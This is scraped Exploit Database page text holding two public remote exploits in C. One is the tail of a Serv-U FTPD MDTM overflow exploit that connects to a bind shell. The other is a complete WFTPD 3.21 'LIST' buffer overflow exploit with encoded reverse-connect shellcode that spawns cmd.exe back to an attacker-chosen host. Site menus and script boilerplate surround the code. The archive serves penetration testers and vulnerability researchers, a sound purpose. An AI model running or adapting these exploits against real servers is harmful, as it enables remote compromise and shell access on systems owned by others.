("num . description\n");printf ("----+-----------------------------------------------""--------\n");for (i = 0; i <= MAX_NUM; i ++) {printf ("%3d | %s\n", i, architectures[i].desc);}printf ("    '\n");return;}int main (int c, char *v[]){int             ch, fd, sd;char     *hostName = NULL, *userName = "ftp", *passWord = "sst@SERV-u";shellport  = port;fprintf (stderr, "Serv-U FTPD 3.x/4.x/5.x MDTM Command remote overflow exploit "VER"\n""bug find by bkbll (bkbll@cnhonker.net) code by Sam (Sam@0x557.org)\n\n");if (c < 2) {showHELP (v[0]);exit (1);}while((ch = getopt(c, v, "h:t:u:p:P:c:d:")) != EOF) {switch(ch) {case 'h':hostName = optarg;break;case 't':x = atoi (optarg);if (x > MAX_NUM) {printf ("[-] wtf your input?\n");exit (-1);}break;case 'u':userName = optarg;break;case 'p':passWord = optarg;break;case 'P':port = atoi (optarg);break;case 'd':shellport = atoi (optarg);break;default:showHELP (v[0]);return 0;}}fd = ftp_login (hostName, port, userName, passWord);if (fd <= 0) {printf ("[-] can't connnect\n");exit (-1);}do_overflow (fd);close (fd);sleep (3);sd = new_tcpConnect (hostName, shellport, 3000);if (sd <= 0) {printf ("[-] failed\n");return -1;}fprintf (stderr, "[+] successed!!\n\n\n");sh (0, 1, sd);close (sd);return 0;}// milw0rm.com [2004-02-27]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 159
WFTPD Server 3.21 - Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDWFTPD Server 3.21 - Remote Buffer OverflowEDB-ID:159CVE:2004-0340EDB Verified:Author:rdxaxlType:remoteExploit:/Platform:WindowsDate:2004-02-29Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** WFTPD buffer overflow exploit, (c) axl 2004, rdxaxl@hotmail.com* Discovered by the very same guy :p** Tested WFTPD versions:** - WFTPD Pro Server 3.21 Release 1 (trial) (latest version)* - WFTPD Pro Server 3.20 Release 2 (trial)* - WFTPD Server 3.21 Release 1 (trial) (latest version)* - WFTPD Server 3.10 Release 1 (trial)** Tested exploit with these remote operating systems:** - Windows XP Pro, SP1** Should be very easy to support other Windows OSes. You may only have* to update ret_addr.*/#include <winsock2.h>#pragma comment(lib, "ws2_32.lib")#include <windows.h>#include <stdio.h>#define MAXLINE 0x1000//#define OLDCODE // Try not to uncomment this...#ifdef OLDCODEstatic char* ret_addr = "\xAC\x9C\xEC\x77";// kernel32.dll 5.1.2600.1106, (WinXP Pro SP1, EN) => pop reg / pop reg / ret#else/* See the comment in exploit() for the reasons I chose this address */static char* ret_addr = "\x5B\xC0\xEB\x77";// kernel32.dll 5.1.2600.1106, (WinXP Pro SP1, EN) => pop reg / pop reg / ret#endifconst unsigned int shlc_offs_enckey = 0x00000025;const unsigned int shlc_offs_encstart = 0x0000002B;const unsigned int shlc_offs_encend = 0x000001B8;unsigned char shlc_code[] ="\xEB\x16\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56""\x34\x12\x5B\x53\x83\xEB\x1D\xC3\xE8\xF5\xFF\xFF\xFF\x33\xC9\xB1""\x64\x81\x74\x8B\x27\x55\x55\x55\x55\xE2\xF6\xFC\x8B\x43\x0A\x31""\x43\x02\x8B\x43\x0E\x31\x43\x06\x89\x4B\x0A\x89\x4B\x0E\x64\x8B""\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\xAD\x8B\x68\x08\x8D""\x83\x67\x01\x00\x00\x55\xE8\xB7\x00\x00\x00\x68\x33\x32\x00\x00""\x68\x77\x73\x32\x5F\x54\xFF\xD0\x96\x8D\x83\x74\x01\x00\x00\x56""\xE8\x9D\x00\x00\x00\x81\xEC\x90\x01\x00\x00\x54\x68\x01\x01\x00""\x00\xFF\xD0\x8D\x83\x7F\x01\x00\x00\x56\xE8\x83\x00\x00\x00\x33""\xC9\x51\x51\x51\x6A\x06\x6A\x01\x6A\x02\xFF\xD0\x97\x8D\x83\x8A""\x01\x00\x00\x56\xE8\x69\x00\x00\x00\x33\xC9\x51\x51\x51\x51\x6A""\x10\x8D\x4B\x02\x51\x57\xFF\xD0\xB9\x54\x00\x00\x00\x2B\xE1\x88""\x6C\x0C\xFF\xE2\xFA\xC6\x44\x24\x10\x44\x41\x88\x4C\x24\x3C\x88""\x4C\x24\x3D\x89\x7C\x24\x48\x89\x7C\x24\x4C\x89\x7C\x24\x50\x49""\x8D\x44\x24\x10\x54\x50\x51\x51\x51\x6A\x01\x51\x51\x8D\x83\xA4""\x01\x00\x00\x50\x51\x8D\x83\x95\x01\x00\x00\x55\xE8\x11\x00\x00""\x00\x59\xFF\xD0\x8D\x83\xAC\x01\x00\x00\x55\xE8\x02\x00\x00\x00""\xFF\xD0\x60\x8B\x7C\x24\x24\x8D\x6F\x78\x03\x6F\x3C\x8B\x6D\x00""\x03\xEF\x83\xC9\xFF\x41\x3B\x4D\x18\x72\x0B\x64\x89\x0D\x00\x00""\x00\x00\x8B\xE1\xFF\xE4\x8B\x5D\x20\x03\xDF\x8B\x1C\x8B\x03\xDF""\x8B\x74\x24\x1C\xAC\x38\x03\x75\xDC\x43\x84\xC0\x75\xF6\x8B\x5D""\x24\x03\xDF\x0F\xB7\x0C\x4B\x8B\x5D\x1C\x03\xDF\x8B\x0C\x8B\x03""\xCF\x89\x4C\x24\x1C\x61\xC3\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61""\x72\x79\x41\x00\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\x00\x57""\x53\x41\x53\x6F\x63\x6B\x65\x74\x41\x00\x57\x53\x41\x43\x6F\x6E""\x6E\x65\x63\x74\x00\x43\x72\x65\x61\x74\x65\x50\x72\x6F\x63\x65""\x73\x73\x41\x00\x63\x6D\x64\x2E\x65\x78\x65\x00\x45\x78\x69\x74""\x50\x72\x6F\x63\x65\x73\x73\x00";static char inbuf[MAXLINE];static unsigned inoffs = 0;const WFTPD_PRO_321_TRIAL = 0; // WFTPD Pro Server 3.21 Release 1 (trial)const WFTPD_PRO_320_TRIAL = 1; // WFTPD Pro Server 3.20 Release 2 (trial)const WFTPD_321_TRIAL = 2; // WFTPD Server 3.21 Release 1 (trial)const WFTPD_310_TRIAL = 3; // WFTPD Server 3.10 Release 1 (trial)int ftpver = WFTPD_PRO_321_TRIAL;int isrd(SOCKET s){fd_set r;FD_ZERO(&r);FD_SET(s, &r);timeval t = {0, 0};int ret = select(1, &r, NULL, NULL, &t);if (ret < 0)return 0;elsereturn ret != 0;}int get_line(SOCKET s, char* string, unsigned len){char* nl;while ((nl = (char*)memchr(inbuf, '\n', inoffs)) == NULL){if (inoffs >= sizeof(inbuf)){printf("[-] Too long line\n");return 0;}int len = recv(s, &inbuf[inoffs], sizeof(inbuf) - inoffs, 0);if (len <= 0){printf("[-] Error receiving data\n");return 0;}inoffs += len;}unsigned nlidx = (unsigned)(ULONG_PTR)(nl - inbuf);if (nlidx >= len){printf("[-] Too small caller buffer\n");return 0;}memcpy(string, inbuf, nlidx);string[nlidx] = 0;if (nlidx > 0 && string[nlidx-1] == '\r')string[nlidx-1] = 0;if (nlidx + 1 >= inoffs)inoffs = 0;else{memcpy(inbuf, &inbuf[nlidx+1], inoffs - (nlidx + 1));inoffs -= nlidx + 1;}return 1;}int ignorerd(SOCKET s){inoffs = 0;while (1){if (!isrd(s))return 1;if (recv(s, inbuf, sizeof(inbuf), 0) < 0)return 0;}}int get_reply_code(SOCKET s){char line[MAXLINE];if (!get_line(s, line, sizeof(line))){printf("[-] Could not get status code\n");return -1;}char c = line[3];line[3] = 0;int code;if (!(c == ' ' || c == '-') || strlen(line) != 3 || !(code = atoi(line))){printf("[-] Weird reply\n");return -1;}char endline[4];memcpy(endline, line, 3);endline[3] = ' ';if (c == '-'){while (1){if (!get_line(s, line, sizeof(line))){printf("[-] Could not get next line\n");return -1;}if (!memcmp(line, endline, sizeof(endline)))break;}}return code;}int sendb(SOCKET s, const char* buf, int len, int flags){while (len){int l = send(s, buf, len, flags);if (l <= 0)break;len -= l;buf += l;}return len == 0;}int sends(SOCKET s, const char* buf, int flags){return sendb(s, buf, (int)strlen(buf), flags);}int is_valid_char(char c){return c != 0 && c != '\n' && c != ' ';}int add_bytes(void* dst, int& dstoffs, int dstlen, const void* src, int srclen){if (dstoffs + srclen > dstlen || dstoffs + srclen < dstoffs){printf("[-] Buffer overflow ;)\n");return 0;}memcpy((char*)dst+dstoffs, src, srclen);dstoffs += srclen;return 1;}int check_invd_bytes(const char* name, const void* buf, int buflen){const char* b = (const char*)buf;for (int i = 0; i < buflen; i++){if (!is_valid_char(b[i])){printf("[-] %s[%u] (%02X) cannot contain bytes 00h, 0Ah, or 20h\n", name, i, b[i]);return 0;}}return 1;}int enc_byte(char& c, char& k){for (int i = 0; i < 0x100; i++){if (!is_valid_char(c ^ i) || !is_valid_char(i))continue;c ^= i;k = i;return 1;}printf("[-] Could not find encryption key for byte %02X\n", c);return 0;}int get_enc_key(char* buf, int size, int offs, int step){for (int i = 0; i < 0x100; i++){if (!is_valid_char(i))continue;for (int j = offs; j < size; j += step){if (!is_valid_char(buf[j] ^ i))break;}if (j < size)continue;return i;}printf("[-] Could not find an encryption key\n");return -1;}int exploit(SOCKET s, unsigned long sip, unsigned short sport){printf("[+] Trying buffer overflow + using SEH handler\n");int ret = 0;char* shellcode = NULL;__try{shellcode = new char[sizeof(shlc_code)-1];memcpy(shellcode, shlc_code, sizeof(shlc_code)-1);shellcode[2] = (char)AF_INET;shellcode[3] = (char)(AF_INET >> 8);shellcode[4] = (char)(sport >> 8);shellcode[5] = (char)sport;shellcode[6] = (char)(sip >> 24);shellcode[7] = (char)(sip >> 16);shellcode[8] = (char)(sip >> 8);shellcode[9] = (char)sip;for (int i = 0; i < 8; i++){if (!enc_byte(shellcode[2+i], shellcode[2+8+i]))__leave;}for (int i = 0; i < 4; i++){int k = get_enc_key(&shellcode[shlc_offs_encstart], shlc_offs_encend-shlc_offs_encstart, i, 4);if (k < 0)__leave;shellcode[shlc_offs_enckey+i] = k;}printf("[+] Shellcode encryption key = %02X%02X%02X%02X\n", shellcode[shlc_offs_enckey+3],shellcode[shlc_offs_enckey+2], shellcode[shlc_offs_enckey+1], shellcode[shlc_offs_enckey]);for (int i = 0; i < shlc_offs_encend-shlc_offs_encstart; i++)shellcode[shlc_offs_encstart+i] ^= shellcode[shlc_offs_enckey + i % 4];if (!ignorerd(s))__leave;char sndbuf[0x1000];int sndbufidx = 0;char* badval = "\x01\xFF\x02\xFE";const char* ftp_cmd = "LIST -";if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ftp_cmd, (int)strlen(ftp_cmd))) // req__leave;switch (ftpver){#ifdef OLDCODEcase WFTPD_310_TRIAL: // doesn't save EBP on the stackcase WFTPD_321_TRIAL: // doesn't save EBP on the stackcase WFTPD_PRO_320_TRIAL:if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "-WFTPD_EXPLOIT_BY_AXL_(C)_2004-", 31) || // 31-byte string!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "\x90\x90\xEB\x28", 4) || // old fs:[0]!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ret_addr, 4) || // exception handler!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // trylevel!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // old EBP!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // ret addr!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg1!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg2!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg3!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg4!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg5!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4)) // arg6__leave;break;case WFTPD_PRO_321_TRIAL:default:if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "-WFTPD_EXPLOIT_BY_AXL_(C)_2004-", 31) || // 31-byte string!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // cookie!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "\x90\x90\xEB\x28", 4) || // old fs:[0]!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ret_addr, 4) || // exception handler!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // trylevel!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // old EBP!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // ret addr!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg1!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg2!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg3!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg4!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg5!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4)) // arg6__leave;break;#elsecase WFTPD_310_TRIAL: // doesn't save EBP on the stackcase WFTPD_321_TRIAL: // doesn't save EBP on the stackcase WFTPD_PRO_320_TRIAL:case WFTPD_PRO_321_TRIAL: // pushes a cookie after old fs:[0]default:/** WFTPD Pro Server 3.21 saves a cookie so that the stack layout isn't the same as the* other versions. However, with the right exception address, we can make it work.* 77EBC05B = kernel32.dll => POP REG / POP REG / RET. This is the exception handler* the older versions will execute. WFTPD Pro Server 3.21 will instead execute the* instructions with the bytes in that same address. In this case, it'll execute these* instructions:* 5B POP EBX* C0EB 77 SHR BL,77* 5B POP EBX* C0EB 77 SHR BL,77* EB 1E JMP SHORT ourcode*/if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "-WFTPD_EXPLOIT_BY_AXL_(C)_2004-", 31) || // 31-byte string!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "\x90\x90\xEB\x28", 4) || // old fs:[0] OR cookie (p321)!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ret_addr, 4) || // exception handler OR old fs:[0] (p321)!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ret_addr, 4) || // trylevel OR exception handler (p321)!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "\xEB\x1E\xFE\xFF", 4) || // (p321)!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4))__leave;break;#endif}if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), shellcode, sizeof(shlc_code)-1) || // our code!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), " \r\n", 3)) // req + end of line__leave;if (!check_invd_bytes("shellcode", shellcode, sizeof(shlc_code)-1) ||!check_invd_bytes("ret_addr", ret_addr, sizeof(ret_addr)-1) ||!check_invd_bytes("sndbuf", sndbuf+5, sndbufidx-3-5))__leave;in_addr a; a.s_addr = htonl(sip);printf("[+] Sending shellcode which will connect to %s:%u...\n", inet_ntoa(a), sport);if (!sendb(s, sndbuf, sndbufidx, 0)){printf("[-] Failed to send shellcode\n");__leave;}printf("[+] Shellcode sent successfully\n");ret = 1;}__finally{delete shellcode;}if (ret == 0)printf("[-] Can't exploit the vulnerability\n");return ret;}int login(SOCKET s, const char* username, const char* userpass){printf("[+] Logging in...\n");int code;if (!ignorerd(s) || !sends(s, "USER ", 0) || !sends(s, username, 0) ||!sends(s, "\r\n", 0) || (code = get_reply_code(s)) < 0){printf("[-] Failed to log in #1\n");return 0;}if (code == 331){if (!sends(s, "PASS ", 0) || !sends(s, userpass, 0) ||!sends(s, "\r\n", 0) || (code = get_reply_code(s)) < 0){printf("[-] Failed to log in #2\n");return 0;}}if (code != 230){printf("[-] Failed to log in. Code %3u\n", code);return 0;}printf("[+] Logged in\n");return 1;}void show_help(char* pname){printf("%s <ip> <port> <sip> <sport> [-u username] [-p userpass] [-v <p321|p320|321|310>]\n", pname);exit(1);}int main(int argc, char** argv){printf("WFTPD <= v3.21r1 buffer overflow exploit, (c) axl 2004, rdxaxl@hotmail.com\n");WSADATA wsa;if (WSAStartup(0x0202, &wsa))return 1;if (argc < 5)show_help(argv[0]);unsigned long ip = ntohl(inet_addr(argv[1]));unsigned short port = (unsigned short)atoi(argv[2]);unsigned long sip = ntohl(inet_addr(argv[3]));unsigned short sport = (unsigned short)atoi(argv[4]);const char* username = "anonymous";const char* userpass = "axl";for (int i = 5; i < argc; i++){if (!strcmp(argv[i], "-u") && i + 1 < argc){username = argv[++i];}else if (!strcmp(argv[i], "-p") && i + 1 < argc){userpass = argv[++i];}else if (!strcmp(argv[i], "-v") && i + 1 < argc){if (!stricmp(argv[i+1], "p321"))ftpver = WFTPD_PRO_321_TRIAL;else if (!stricmp(argv[i+1], "p320"))ftpver = WFTPD_PRO_320_TRIAL;else if (!stricmp(argv[i+1], "321"))ftpver = WFTPD_321_TRIAL;else if (!stricmp(argv[i+1], "310"))ftpver = WFTPD_310_TRIAL;elseshow_help(argv[0]);i++;}elseshow_help(argv[0]);}if (!ip || !port || !sip || !sport)show_help(argv[0]);sockaddr_in saddr;memset(&saddr, 0, sizeof(saddr));saddr.sin_family = AF_INET;saddr.sin_port = htons(port);saddr.sin_addr.s_addr = htonl(ip);SOCKET s = INVALID_SOCKET;__try{in_addr a; a.s_addr = htonl(ip);printf("[+] Connecting to %s:%u...\n", inet_ntoa(a), port);s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);if (s < 0 || connect(s, (sockaddr*)&saddr, sizeof(saddr)) < 0){printf("[-] Could not connect\n");__leave;}printf("[+] Connected\n");int code = get_reply_code(s);if (code != 220){printf("[-] Got reply %3u\n", code);__leave;}if (!login(s, username, userpass))__leave;if (!exploit(s, sip, sport))printf("[-] Lucky bastards...\n");elseprintf("[+] Santa's watching you!\n");}__finally{if (s != INVALID_SOCKET)closesocket(s);}return 0;}// milw0rm.com [2004-02-29]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit 